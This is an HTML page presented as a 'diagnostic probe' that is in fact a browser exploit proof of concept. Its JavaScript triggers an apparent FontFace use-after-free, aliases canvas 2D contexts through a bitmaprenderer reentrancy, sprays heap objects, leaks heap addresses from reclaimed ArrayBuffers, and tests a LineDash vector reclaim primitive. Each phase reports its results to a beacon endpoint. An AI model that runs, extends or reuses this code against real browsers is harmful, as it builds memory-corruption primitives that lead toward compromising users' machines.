<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P904: LineDash Out-of-Line Vector Reclaim & FontFace Wrapper Oracle</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P904...</div>
<h2>P904: LineDash Out-of-Line Vector Reclaim & FontFace Wrapper Oracle</h2>
<pre id="log">Initializing diagnostic probe P904...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P904-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

log('[*] Probe P904 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: FontFace UAF Setup (Placed at top for clean timing)
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

// Preserve live FontFace wrapper for bb1 before deletion if available
var bb1Wrapper = null;
try {
  document.fonts.forEach(function(f) {
    if (f.family === 'bb1' || f.family === '"bb1"') bb1Wrapper = f;
  });
} catch(e) {}

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

/* ============================================================
 * PHASE 2: Dual Canvas Aliasing (100% Crash-Free)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 2: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * ASYNCHRONOUS EVALUATION (800ms window for rock-solid font load)
 * ============================================================ */
setTimeout(function() {
  delete FontFace.prototype.then;

  /* --- Check FontFace UAF Leak --- */
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var delta = 0;
  var fontDV = null;

  if (bestI >= 0 && bestNz >= 4) {
    fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
      delta = H_lo - q13lo;
    }
  }

  log('[+] Font UAF: H=' + Hstr + ' | q13=' + q13str + ' (Slot #' + bestI + ', nz=' + bestNz + ')', bestI >= 0 ? 'ok' : 'fail');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI + '|nz=' + bestNz);

  /* ============================================================
   * PHASE 3: LineDash Out-of-Line Vector Transmission
   * ============================================================ */
  var dashSyncOk = false;
  var M1 = 987654.375;
  var M2 = 123456.625;
  var dashPat = [];
  for (var d = 0; d < 32; d++) {
    dashPat.push(d === 0 ? M1 : (d === 1 ? M2 : 100.0 + d));
  }

  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // Inscribe pattern into sprayCtxs[idx1] (allocates 32*8 = 256 bytes)
      sprayCtxs[idx1].setLineDash(dashPat);

      // Read back via dangling innerCtx1
      var readDash = innerCtx1.getLineDash();
      if (readDash && readDash.length === 32 && Math.abs(readDash[0] - M1) < 0.001 && Math.abs(readDash[1] - M2) < 0.001) {
        dashSyncOk = true;
      }
    } catch(e) {}
  }

  log('[+] Phase 3: LineDash 256B Transmission: ok=' + dashSyncOk, dashSyncOk ? 'hot' : 'info');
  syncBn('DASH-SYNC', 'ok=' + dashSyncOk);

  /* ============================================================
   * PHASE 4: Vector Free & ArrayBuffer Reclaim Scan
   * ============================================================ */
  var reclaimHits = 0;
  var reclaimLog = [];

  if (dashSyncOk && idx1 >= 0) {
    try {
      // Clear lineDash on innerCtx1, freeing the 256B vector to FastMalloc
      innerCtx1.setLineDash([]);

      // Immediately spray 48 ArrayBuffer(256) to catch the freed vector
      var reclaimABs = [];
      for (var r = 0; r < 48; r++) {
        reclaimABs.push(new ArrayBuffer(256));
      }

      // Scan for marker M1 or M2
      for (var a = 0; a < reclaimABs.length; a++) {
        var f64 = new Float64Array(reclaimABs[a]);
        for (var k = 0; k < f64.length; k++) {
          if (Math.abs(f64[k] - M1) < 0.001 || Math.abs(f64[k] - M2) < 0.001) {
            reclaimHits++;
            reclaimLog.push('slot=' + a + ',off=' + (k * 8) + ',val=' + f64[k]);
            break;
          }
        }
      }
    } catch(e) {
      reclaimLog.push('err=' + (e.message || '').slice(0, 40));
    }
  }

  log('[+] Phase 4: LineDash Reclaim Scan: hits=' + reclaimHits + ' (' + (reclaimLog.slice(0, 2).join('; ') || 'none') + ')', reclaimHits > 0 ? 'hot' : 'info');
  syncBn('DASH-RECLAIM', 'hits=' + reclaimHits + '|log=' + (reclaimLog.slice(0, 2).join(';') || 'none'));

  /* ============================================================
   * PHASE 5: Live FontFace Wrapper Introspection
   * ============================================================ */
  var wrapperInfo = 'none';
  if (bb1Wrapper) {
    try {
      wrapperInfo = 'status=' + bb1Wrapper.status + ',fam=' + bb1Wrapper.family;
    } catch(e) {
      wrapperInfo = 'err=' + (e.message || '').slice(0, 40);
    }
  }
  log('[+] Phase 5: bb1 FontFace Wrapper: ' + wrapperInfo, 'info');
  syncBn('WRAPPER-INFO', 'info=' + wrapperInfo);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P904 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P904 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Dash Sync: ' + dashSyncOk + ' | Reclaim Hits: ' + reclaimHits, reclaimHits > 0 ? 'hot' : 'ok');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|dashSync=' + dashSyncOk + '|reclaimHits=' + reclaimHits + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 800);
</script>
</body>
</html>
